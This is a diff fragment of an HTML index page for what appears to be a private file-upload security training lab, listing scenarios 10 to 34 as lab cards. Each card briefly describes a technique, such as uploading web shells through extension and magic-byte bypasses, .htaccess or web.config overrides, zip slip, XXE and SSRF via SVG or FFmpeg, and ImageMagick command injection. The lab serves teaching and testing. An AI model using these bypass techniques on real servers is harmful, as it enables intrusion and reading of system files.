+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>Filename XSS</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario10/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 11 scenario 11 http put method upload put shell medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">11</div>
+                        <h3 class="lab-scenario">Scenario 11</h3>
+                        <p class="lab-challenge">HTTP PUT Method Upload</p>
+                        <p class="lab-description">Bypass multipart checks by sending raw PUT request with Burp Repeater.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>PUT Shell</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario11/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 12 scenario 12 svg stored xss svg stored xss medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">12</div>
+                        <h3 class="lab-scenario">Scenario 12</h3>
+                        <p class="lab-challenge">SVG Stored XSS</p>
+                        <p class="lab-description">SVG can contain JavaScript. Upload SVG with onload alert via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>SVG Stored XSS</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario12/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 13 scenario 13 svg xxe svg xxe medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">13</div>
+                        <h3 class="lab-scenario">Scenario 13</h3>
+                        <p class="lab-challenge">SVG XXE</p>
+                        <p class="lab-description">SVG XML parser resolves external entities. Upload XXE payload to read /etc/hostname.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>SVG XXE</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario13/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="medium" data-search="scenario 14 scenario 14 zip bomb zip bomb (dos) medium medium burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">14</div>
+                        <h3 class="lab-scenario">Scenario 14</h3>
+                        <p class="lab-challenge">Zip Bomb</p>
+                        <p class="lab-description">Small ZIP expands to huge size causing DoS. Upload highly compressible ZIP.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-medium">medium</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>ZIP Bomb (DoS)</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario14/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 15 scenario 15 remote url ssrf url ssrf medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">15</div>
+                        <h3 class="lab-scenario">Scenario 15</h3>
+                        <p class="lab-challenge">Remote URL SSRF</p>
+                        <p class="lab-description">Server fetches user-supplied URL without restriction. Use Burp to SSRF internal services.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>URL SSRF</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario15/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 16 scenario 16 document xxe (ooxml) document xxe medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">16</div>
+                        <h3 class="lab-scenario">Scenario 16</h3>
+                        <p class="lab-challenge">Document XXE (OOXML)</p>
+                        <p class="lab-description">Office docs are ZIP with XML. Inject XXE entity to read local files.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>Document XXE</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario16/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 17 scenario 17 windows ads bypass windows ads medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">17</div>
+                        <h3 class="lab-scenario">Scenario 17</h3>
+                        <p class="lab-challenge">Windows ADS Bypass</p>
+                        <p class="lab-description">NTFS ::$DATA bypasses blacklist. Use Burp Repeater to upload shell.php::$DATA.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>Windows ADS</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario17/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="high" data-search="scenario 18 scenario 18 .htaccess override config (.htaccess) hard high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">18</div>
+                        <h3 class="lab-scenario">Scenario 18</h3>
+                        <p class="lab-challenge">.htaccess Override</p>
+                        <p class="lab-description">Upload .htaccess to map .jpg to PHP, then upload shell.jpg. Two-step bypass with Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Config (.htaccess)</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario18/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="high" data-search="scenario 19 scenario 19 nested extension stripping nested extension hard high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">19</div>
+                        <h3 class="lab-scenario">Scenario 19</h3>
+                        <p class="lab-challenge">Nested Extension Stripping</p>
+                        <p class="lab-description">Filter strips .php once. Use .p.phphp to reconstruct .php after stripping. Use Burp Repeater.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Nested Extension</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario19/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="high" data-search="scenario 20 scenario 20 magic byte bypass magic bytes hard high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">20</div>
+                        <h3 class="lab-scenario">Scenario 20</h3>
+                        <p class="lab-challenge">Magic Byte Bypass</p>
+                        <p class="lab-description">Server checks file header. Prepend GIF89a to PHP shell and upload via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Magic Bytes</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario20/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="high" data-search="scenario 21 scenario 21 image polyglot shell in image hard high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">21</div>
+                        <h3 class="lab-scenario">Scenario 21</h3>
+                        <p class="lab-challenge">Image Polyglot</p>
+                        <p class="lab-description">Valid image containing PHP in EXIF/PNG chunk. Create polyglot and upload via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Shell in Image</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario21/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="critical" data-search="scenario 22 scenario 22 path traversal via filename path traversal hard critical burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">22</div>
+                        <h3 class="lab-scenario">Scenario 22</h3>
+                        <p class="lab-challenge">Path Traversal via Filename</p>
+                        <p class="lab-description">Filename with ../ escapes uploads/. Use Burp Repeater to traverse and write shell.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-critical">critical</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Path Traversal</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario22/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="critical" data-search="scenario 23 scenario 23 race condition (toctou) race condition hard critical burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">23</div>
+                        <h3 class="lab-scenario">Scenario 23</h3>
+                        <p class="lab-challenge">Race Condition (TOCTOU)</p>
+                        <p class="lab-description">File exists briefly before AV deletes it. Use Burp Intruder to race and execute.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-critical">critical</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Race Condition</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario23/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="critical" data-search="scenario 24 scenario 24 zip slip zip slip hard critical burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">24</div>
+                        <h3 class="lab-scenario">Scenario 24</h3>
+                        <p class="lab-challenge">Zip Slip</p>
+                        <p class="lab-description">ZIP entry with ../../ escapes extraction dir. Create malicious ZIP with Python and upload via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-critical">critical</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Zip Slip</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario24/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="high" data-search="scenario 25 scenario 25 archive symlink read archive symlink hard high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">25</div>
+                        <h3 class="lab-scenario">Scenario 25</h3>
+                        <p class="lab-challenge">Archive Symlink Read</p>
+                        <p class="lab-description">Archive with symlink to /etc/passwd. Create tar with symlink via Python and upload.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Archive Symlink</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario25/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="critical" data-search="scenario 26 scenario 26 imagemagick command injection image processing hard critical burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">26</div>
+                        <h3 class="lab-scenario">Scenario 26</h3>
+                        <p class="lab-challenge">ImageMagick Command Injection</p>
+                        <p class="lab-description">ImageMagick uses filename in shell command. Inject via filename using Burp Repeater.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-critical">critical</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Image Processing</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario26/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="critical" data-search="scenario 27 scenario 27 uwsgi config rce uwsgi config hard critical burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">27</div>
+                        <h3 class="lab-scenario">Scenario 27</h3>
+                        <p class="lab-challenge">uWSGI Config RCE</p>
+                        <p class="lab-description">uWSGI exec:// scheme in ini leads to RCE. Upload malicious uwsgi.ini via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-critical">critical</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>uWSGI Config</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario27/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="high" data-search="scenario 28 scenario 28 iis web.config override server config hard high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">28</div>
+                        <h3 class="lab-scenario">Scenario 28</h3>
+                        <p class="lab-challenge">IIS web.config Override</p>
+                        <p class="lab-description">IIS web.config maps .jpg to PHP. Upload web.config then shell.jpg via Burp - two-step.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Server Config</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario28/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="high" data-search="scenario 29 scenario 29 .user.ini auto-prepend server config hard high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">29</div>
+                        <h3 class="lab-scenario">Scenario 29</h3>
+                        <p class="lab-challenge">.user.ini Auto-Prepend</p>
+                        <p class="lab-description">PHP .user.ini sets auto_prepend_file to JPG. Upload .user.ini then shell.jpg via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Server Config</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario29/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 30 scenario 30 trailing dot/space bypass filter bypass medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">30</div>
+                        <h3 class="lab-scenario">Scenario 30</h3>
+                        <p class="lab-challenge">Trailing Dot/Space Bypass</p>
+                        <p class="lab-description">Windows strips trailing dot/space. Bypass .php filter with shell.php. using Burp Repeater.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>Filter Bypass</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario30/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 31 scenario 31 iis semicolon bypass iis bypass medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">31</div>
+                        <h3 class="lab-scenario">Scenario 31</h3>
+                        <p class="lab-challenge">IIS Semicolon Bypass</p>
+                        <p class="lab-description">IIS 6.0 executes shell.asp;.jpg as ASP. Upload with semicolon using Burp (quoted filename).</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>IIS Bypass</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario31/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 32 scenario 32 ssi injection (.shtml) ssi medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">32</div>
+                        <h3 class="lab-scenario">Scenario 32</h3>
+                        <p class="lab-challenge">SSI Injection (.shtml)</p>
+                        <p class="lab-description">SHTML supports SSI exec. Upload malicious .shtml via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>SSI</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario32/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="medium" data-search="scenario 33 scenario 33 svg ssrf (xlink) svg ssrf medium medium burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">33</div>
+                        <h3 class="lab-scenario">Scenario 33</h3>
+                        <p class="lab-challenge">SVG SSRF (XLink)</p>
+                        <p class="lab-description">SVG image tag triggers SSRF. Upload SVG with external URL via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-medium">medium</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>SVG SSRF</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario33/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="hard" data-sev="high" data-search="scenario 34 scenario 34 ffmpeg hls ssrf / lfi audio/video hard high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">34</div>
+                        <h3 class="lab-scenario">Scenario 34</h3>
+                        <p class="lab-challenge">FFmpeg HLS SSRF / LFI</p>
+                        <p class="lab-description">FFmpeg HLS playlist can read file:///etc/passwd. Upload malicious m3u8 via Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-hard">hard</strong></div>
+                            <div><span>category</span><strong>Audio/Video</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario34/">Launch lab &rarr;</a>
+                    </article>
+
+                    </div>
+
+                    <!-- No search/filter results -->
+                    <div class="no-results" id="no-results" hidden>
+                        <span aria-hidden="true">∅</span>
+                        <h3>No scenarios found</h3>
+                        <p>Try a different search term or clear the active filter.</p>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+    </main>
+
+    <!-- ═══════ Footer ═══════ -->
+    <footer>
+        <div class="container footer-content">
+            <div>
+                <strong>File Upload</strong>
+                <span>private test environment · security laboratories</span>
+            </div>
+            <code>34 scenarios ready · php 8.4 runtime</code>
+        </div>
+    </footer>
+
+    <script src="js/lab.js?v=20"></script>
+</body>
+</html>
